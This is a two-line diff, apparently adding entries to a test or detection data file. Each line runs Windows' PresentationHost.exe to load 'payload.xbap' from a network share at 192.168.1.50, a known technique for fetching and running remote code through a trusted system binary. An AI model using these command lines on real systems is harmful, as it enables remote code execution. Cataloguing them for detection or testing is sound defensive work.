@@ -1,0 +1,2 @@
+PresentationHost.exe \\192.168.1.50\share\payload.xbap
+PresentationHost.exe file://192.168.1.50/share/payload.xbap
